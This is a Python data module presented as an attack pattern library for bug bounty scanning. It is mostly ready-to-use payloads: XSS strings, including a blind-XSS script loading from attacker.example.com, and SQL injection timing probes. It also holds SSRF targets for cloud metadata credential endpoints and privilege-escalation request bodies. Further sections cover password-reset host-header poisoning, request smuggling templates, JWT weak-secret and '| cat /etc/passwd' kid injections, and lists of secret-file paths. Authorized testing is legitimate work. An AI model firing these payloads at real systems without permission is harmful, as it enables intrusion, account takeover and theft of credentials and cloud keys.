"""
Attack Pattern Library — compiled from 5700+ real bug bounty reports.
Provides tech-specific payloads, endpoint patterns, and success indicators
derived from the Sai-RT.csv dataset and public bug bounty writeups.
"""

# ── CORS ──────────────────────────────────────────────────────────────────────
# Source: 1050 CORS reports in dataset; top bug class
CORS_ATTACK_ORIGINS = [
    "null",                           # null origin bypass (file:// / sandboxed iframe)
    "https://evil.example.com",       # basic reflected-origin test
    "https://notexample.com",         # partial-match bypass (if allowlist checks prefix)
    "https://example.com.evil.com",   # suffix-match bypass
    "https://subdomain.{target}",     # trusted-subdomain if ACAO reflects all subdomains
]

CORS_SENSITIVE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/v1/me", "/api/v1/user", "/account/settings",
    "/graphql", "/api/graphql", "/gql",
]

# ── CSRF ──────────────────────────────────────────────────────────────────────
# Source: 660 CSRF reports; SameSite bypass and missing token checks
CSRF_SENSITIVE_ACTIONS = [
    "/account/email/change", "/account/password/change", "/account/delete",
    "/api/user/email", "/api/user/password", "/api/user/delete",
    "/settings/email", "/settings/password", "/settings/delete",
    "/profile/update", "/profile/email", "/user/settings",
    "/api/account/close", "/api/account/transfer",
    "/logout", "/api/logout",  # login CSRF
]

CSRF_BYPASS_HEADERS = {
    "Content-Type": "text/plain",  # bypass JSON-only CSRF protection
    "X-Requested-With": "",        # remove AJAX header requirement
}

# ── XSS ───────────────────────────────────────────────────────────────────────
# Source: 611 stored XSS, 183 reflected XSS, 124 blind XSS, 40 DOM XSS reports
XSS_PAYLOADS = [
    # Basic (often blocked)
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",

    # Event handlers (bypass tag filters)
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<body onresize=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",

    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",

    # WAF bypass (from XSS case study in dataset)
    "<ScRiPt>alert(1)</ScRiPt>",
    "<%2fscript>alert(1)<%2fscript>",
    "<svg><script>alert(1)</script>",
    "<math><mtext></math><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'>",
    "javascript:alert(1)",

    # Blind XSS (exfil to webhook)
    "<script src=https://attacker.example.com/xss.js></script>",

    # Template-context payloads (SSTI bleed)
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
]

XSS_TEST_PARAMS = [
    "q", "s", "search", "query", "input", "text", "message",
    "name", "username", "title", "comment", "description",
    "redirect", "url", "next", "return", "callback",
    "error", "msg", "info", "success", "status",
]

# ── SQL INJECTION ──────────────────────────────────────────────────────────────
# Source: 9 direct SQLi + many auth bypass via SQLi in dataset
SQLI_ERROR_PAYLOADS = ["'", '"', "1'", "1\"", "''", "\\", "--", "1 OR 1=1--"]

SQLI_TIME_PAYLOADS = [
    "1; SELECT SLEEP(4)--",
    "1' AND SLEEP(4)--",
    "1 AND SLEEP(4)--",
    "1'; SELECT SLEEP(4)--",
    "1' AND pg_sleep(4)--",
    "1; WAITFOR DELAY '0:0:4'--",
    "1' AND (SELECT 4 FROM (SELECT SLEEP(4))x)--",
]

SQLI_ERROR_PATTERNS = [
    "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation",
    "ora-", "pg_query", "sqlite_", "unterminated string",
    "invalid input syntax", "division by zero", "sqlstate",
    "db2 sql error", "microsoft jet database",
]

SQLI_TEST_PARAMS = [
    "id", "user_id", "order_id", "item_id", "product_id", "cat", "category",
    "search", "q", "query", "filter", "sort", "page", "limit",
    "username", "email", "login", "user", "name",
]

# ── SSRF ───────────────────────────────────────────────────────────────────────
# Source: 79 SSRF + 18 blind SSRF reports in dataset
SSRF_PARAMS = [
    "url", "uri", "endpoint", "redirect", "next", "path", "dest",
    "destination", "target", "src", "href", "callback", "fetch", "load",
    "proxy", "image", "file", "link", "imageUrl", "image_url",
    "fileUrl", "file_url", "returnUrl", "return_url", "apiUrl", "api_url",
    "webhook", "webhookUrl", "webhook_url", "pingback", "notify",
    "host", "server", "remote", "resource", "data",
]

SSRF_TARGETS = [
    # AWS IMDSv1 — most common in dataset (AWS: 433 mentions)
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam", "security-credentials"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    ("http://169.254.169.254/latest/user-data", ["#!/", "cloud-init", "password", "key"]),
    # AWS IPv6 bypass
    ("http://[fd00:ec2::254]/latest/meta-data/", ["ami-id", "instance-id"]),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/instance/", ["id", "zone", "service-accounts"]),
    # Azure IMDS
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["subscriptionId", "resourceGroupName"]),
    # Internal services
    ("http://localhost:6379/", ["PONG", "+PONG", "redis"]),
    ("http://localhost:9200/", ["elasticsearch", "cluster_name", "version"]),
    ("http://localhost:2375/containers/json", ["Id", "Names", "Image"]),
    ("http://localhost:4040/api/tunnels", ["tunnels", "public_url", "ngrok"]),
    ("http://127.0.0.1:8080/", ["admin", "dashboard", "internal"]),
    ("http://127.0.0.1:3000/", ["admin", "grafana", "kibana"]),
]

SSRF_BYPASS_ENCODINGS = [
    "http://0177.0.0.1/",          # octal IP
    "http://2130706433/",           # decimal IP for 127.0.0.1
    "http://[::1]/",                # IPv6 localhost
    "http://127.1/",                # short-form
    "http://0x7f000001/",           # hex IP
]

# ── IDOR ───────────────────────────────────────────────────────────────────────
# Source: 1854 IDOR reports — top vulnerability in dataset
IDOR_ID_PARAMS = [
    "id", "user_id", "userId", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "invoiceId",
    "file_id", "fileId", "document_id", "documentId",
    "ticket_id", "ticketId", "report_id", "reportId",
    "org_id", "orgId", "team_id", "teamId", "group_id", "groupId",
    "profile_id", "profileId", "customer_id", "customerId",
    "transaction_id", "transactionId", "payment_id", "paymentId",
    "subscription_id", "subscriptionId", "plan_id", "planId",
    "project_id", "projectId", "workspace_id", "workspaceId",
    "record_id", "recordId", "object_id", "objectId",
]

IDOR_ENDPOINT_PATTERNS = [
    r"/api/users?/\d+",
    r"/api/accounts?/\d+",
    r"/api/orders?/\d+",
    r"/api/profiles?/\d+",
    r"/api/invoices?/\d+",
    r"/api/tickets?/\d+",
    r"/api/files?/\d+",
    r"/api/documents?/\d+",
    r"/users?/\d+",
    r"/accounts?/\d+",
]

# ── PRIVILEGE ESCALATION ───────────────────────────────────────────────────────
# Source: 276 privilege escalation reports in dataset
PRIV_ESC_PARAMS = [
    # Role/permission parameters to inject into request bodies
    {"role": "admin"},
    {"role": "administrator"},
    {"role": "superuser"},
    {"is_admin": True},
    {"is_admin": "true"},
    {"is_admin": 1},
    {"admin": True},
    {"admin": "true"},
    {"admin": 1},
    {"isAdmin": True},
    {"isAdmin": "true"},
    {"permission": "admin"},
    {"permissions": ["admin", "read", "write"]},
    {"scope": "admin"},
    {"group": "admin"},
    {"user_type": "admin"},
    {"userType": "ADMIN"},
    {"access_level": 9999},
    {"accessLevel": 9999},
    {"privilege": "admin"},
    {"level": 100},
    {"tier": "enterprise"},
    {"plan": "enterprise"},
    {"subscription": "premium"},
    {"verified": True},
    {"email_verified": True},
    {"approved": True},
]

PRIV_ESC_ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/users", "/admin/dashboard",
    "/admin/settings", "/admin/config", "/admin/reports",
    "/api/admin", "/api/admin/users", "/api/admin/settings",
    "/api/internal", "/api/internal/users",
    "/management", "/manage", "/superuser",
    "/console", "/debug", "/actuator",
    "/actuator/env", "/actuator/beans", "/actuator/mappings",
    "/.env", "/.git/config", "/.git/HEAD",
    "/config.json", "/config.yaml", "/settings.json",
    "/phpinfo.php", "/info.php", "/server-status",
    "/wp-admin", "/wp-login.php", "/wordpress/wp-admin",
]

# ── ACCOUNT TAKEOVER ───────────────────────────────────────────────────────────
# Source: 167 ATO + 168 open redirect + OAuth/JWT chains in dataset
ATO_PASSWORD_RESET_TESTS = [
    # Host header injection in password reset email
    {"Host": "attacker.example.com"},
    {"X-Forwarded-Host": "attacker.example.com"},
    {"X-Host": "attacker.example.com"},
    {"X-Original-URL": "https://attacker.example.com"},
    {"X-Rewrite-URL": "https://attacker.example.com"},
]

ATO_RESET_ENDPOINTS = [
    "/forgot-password", "/forgot_password", "/forgotpassword",
    "/reset-password", "/reset_password", "/resetpassword",
    "/password/reset", "/password/forgot", "/password/new",
    "/api/password/reset", "/api/forgot-password",
    "/auth/forgot-password", "/auth/reset-password",
    "/users/password/new", "/accounts/password/reset",
]

ATO_EMAIL_CHANGE_ENDPOINTS = [
    "/account/email", "/settings/email", "/profile/email",
    "/api/account/email", "/api/user/email", "/api/profile/email",
    "/user/settings/email", "/account/settings/email",
]

# ── CORS MISCONFIGURATION ─────────────────────────────────────────────────────
# Source: 1050 CORS reports — tests for ACAO wildcard + credentials, reflected origin
CORS_CHECKS = {
    "wildcard_with_credentials": {
        "description": "Access-Control-Allow-Origin: * with Allow-Credentials: true",
        "severity": "high",
    },
    "reflected_origin": {
        "description": "Origin header is reflected back in ACAO without allowlist validation",
        "severity": "high",
    },
    "null_origin": {
        "description": "null Origin is allowed — exploitable via sandboxed iframe",
        "severity": "high",
    },
    "subdomain_wildcard": {
        "description": "Any subdomain of the target is trusted",
        "severity": "medium",
    },
    "prefix_bypass": {
        "description": "CORS origin allowlist uses prefix match, bypassable with attacker.target.com",
        "severity": "high",
    },
}

# ── CACHE POISONING ────────────────────────────────────────────────────────────
# Source: 104 cache poisoning reports; CloudFront: 120 mentions in dataset
CACHE_POISON_HEADERS = [
    # Unkeyed headers that affect response but aren't in cache key
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    # Port-based
    "X-Forwarded-Port",
    # Protocol-based
    "X-Forwarded-Proto",
    # Fat GET (body parameters ignored in cache key)
    "X-HTTP-Method-Override",
]

CACHE_POISON_VALUES = [
    "evil.example.com",
    "attacker.com",
    "evil.com",
]

# ── REQUEST SMUGGLING ─────────────────────────────────────────────────────────
# From writeups dataset: Apple $36k, Akamai $46k
REQUEST_SMUGGLING_PAYLOADS = {
    "cl_te": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n\r\n"
        "0\r\n\r\n"
        "X"
    ),
    "te_cl": (
        "POST / HTTP/1.1\r\n"
        "Host: {target}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 3\r\n\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n\r\n"
    ),
}

# ── RACE CONDITIONS ────────────────────────────────────────────────────────────
# Source: 39 race condition reports — coupon abuse, balance transfer, double-spend
RACE_CONDITION_ENDPOINTS = [
    "/api/coupon/apply", "/api/promo/apply", "/api/voucher/redeem",
    "/api/gift/redeem", "/api/code/apply",
    "/api/transfer", "/api/payment", "/api/purchase",
    "/api/withdraw", "/api/refund",
    "/api/vote", "/api/like", "/api/follow",
    "/api/subscribe", "/api/trial/start",
    "/checkout", "/checkout/complete",
]

# ── BUSINESS LOGIC ─────────────────────────────────────────────────────────────
# Source: 51 business logic + 32 coupon abuse reports
BUSINESS_LOGIC_TESTS = [
    # Negative quantities/prices
    {"field": "quantity", "value": -1},
    {"field": "amount", "value": -1},
    {"field": "price", "value": -0.01},
    {"field": "total", "value": -100},
    # Integer overflow
    {"field": "quantity", "value": 9999999999},
    {"field": "amount", "value": 2147483648},
    # Zero
    {"field": "price", "value": 0},
    {"field": "amount", "value": 0},
]

# ── GRAPHQL ────────────────────────────────────────────────────────────────────
# Source: 175 GraphQL reports in dataset; top Amazon internal service
GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/gql", "/query",
    "/graph", "/v1/graphql", "/v2/graphql",
    "/graphql/v1", "/graphql/v2",
    "/prod/graphql", "/freight/ql",  # from dataset endpoint patterns
    "/a9g-api-gateway/graphql",
]

GRAPHQL_INTROSPECTION = '{"query":"{__schema{types{name fields{name}}}}"}'
GRAPHQL_BATCH = '[{"query":"{__typename}"},{"query":"{__typename}"}]'
GRAPHQL_NOSQL_INJECTION = '{"query":"{ user(id: \\"1 OR 1=1\\") { id email } }"}'
GRAPHQL_AUTH_BYPASS_QUERIES = [
    '{"query":"{ users { id email password } }"}',
    '{"query":"{ allUsers { id email role } }"}',
    '{"query":"{ admin { id email } }"}',
]

# ── JWT ────────────────────────────────────────────────────────────────────────
# Source: 60 JWT reports + analysis from writeups
JWT_WEAK_SECRETS = [
    "secret", "password", "admin", "key", "test", "123456",
    "changeme", "jwt_secret", "your-256-bit-secret", "supersecret",
    "mysecret", "private", "app_secret", "api_key", "passw0rd",
    "qwerty", "12345678", "letmein", "master", "dev",
    "development", "staging", "production", "token",
    "", "null", "none", "undefined",
]

JWT_KID_PAYLOADS = [
    "../../dev/null",
    "/dev/null",
    "../../etc/passwd",
    "| cat /etc/passwd",
    "../../../tmp/evil.key",
]

# ── OPEN REDIRECT ─────────────────────────────────────────────────────────────
# Source: 168 open redirect reports; common chain to ATO via OAuth
REDIRECT_PARAMS = [
    "url", "redirect", "redirect_uri", "redirect_url", "redirectTo",
    "next", "return", "returnUrl", "return_url", "returnTo",
    "goto", "dest", "destination", "link", "to", "ref",
    "rurl", "target", "forward", "continue", "from",
    "successUrl", "success_url", "failUrl", "fail_url",
    "callbackUrl", "callback_url", "callback",
    "login_hint", "state",  # OAuth params
]

REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "\\\\evil.example.com",
    "/\\evil.example.com",
    "https:evil.example.com",
    "\r\nevil.example.com",
    "%0d%0aLocation:evil.example.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

# ── TECH FINGERPRINTING ────────────────────────────────────────────────────────
# Maps response signals to likely vulnerability patterns
TECH_SIGNATURES = {
    "spring": {
        "signals": ["X-Application-Context", "Whitelabel Error Page", "Spring Boot"],
        "prioritize": ["actuator", "ssrf", "xxe", "sqli"],
        "paths": ["/actuator", "/actuator/health", "/actuator/env", "/actuator/beans"],
    },
    "django": {
        "signals": ["csrfmiddlewaretoken", "Django", "WSGI/Django"],
        "prioritize": ["sqli", "ssti", "csrf", "idor"],
        "paths": ["/admin/", "/django-admin/"],
    },
    "rails": {
        "signals": ["X-Runtime", "X-Request-Id", "Ruby on Rails"],
        "prioritize": ["mass_assignment", "sqli", "idor"],
        "paths": ["/rails/info", "/rails/mailers"],
    },
    "laravel": {
        "signals": ["laravel_session", "XSRF-TOKEN", "Laravel"],
        "prioritize": ["sqli", "xss", "csrf", "idor"],
        "paths": ["/api/user", "/sanctum/csrf-cookie"],
    },
    "graphql": {
        "signals": ["application/graphql", "__schema", "GraphQL"],
        "prioritize": ["graphql", "idor", "auth_bypass"],
        "paths": ["/graphql", "/gql", "/api/graphql"],
    },
    "aws": {
        "signals": ["x-amz-request-id", "x-amz-id-2", "AmazonS3", "CloudFront"],
        "prioritize": ["ssrf", "cors", "cache_poisoning", "s3_takeover"],
        "paths": [],
    },
    "wordpress": {
        "signals": ["wp-content", "wp-includes", "WordPress"],
        "prioritize": ["xss", "sqli", "auth_bypass"],
        "paths": ["/wp-admin/", "/wp-login.php", "/xmlrpc.php"],
    },
    "fastapi": {
        "signals": ["FastAPI", "/openapi.json", "/docs", "/redoc"],
        "prioritize": ["idor", "mass_assignment", "jwt", "ssrf"],
        "paths": ["/openapi.json", "/docs", "/redoc", "/api/v1/"],
    },
    "express": {
        "signals": ["Express", "X-Powered-By: Express"],
        "prioritize": ["prototype_pollution", "idor", "cors", "ssrf"],
        "paths": ["/api/"],
    },
}

# ── COMMON SENSITIVE PATHS ────────────────────────────────────────────────────
COMMON_SENSITIVE_PATHS = [
    # Config & secrets
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.json", "/config.yaml", "/config.yml", "/settings.json",
    "/web.config", "/app.config", "/appsettings.json",
    "/docker-compose.yml", "/docker-compose.yaml",
    # Source control
    "/.git/config", "/.git/HEAD", "/.svn/entries",
    "/.github/workflows/", "/Makefile", "/Dockerfile",
    # API & docs
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
    "/api-docs", "/api/docs", "/api/swagger",
    # Monitoring & debug
    "/actuator", "/actuator/env", "/actuator/health",
    "/_ah/admin", "/_ah/info", "/server-status", "/server-info",
    "/debug", "/debug/vars", "/debug/pprof",
    "/__debug__", "/__admin__",
    # Backup files
    "/backup.sql", "/dump.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz",
    # CMS
    "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
    "/admin/", "/cms/", "/management/",
    # Cloud
    "/latest/meta-data/", "/computeMetadata/v1/",
]
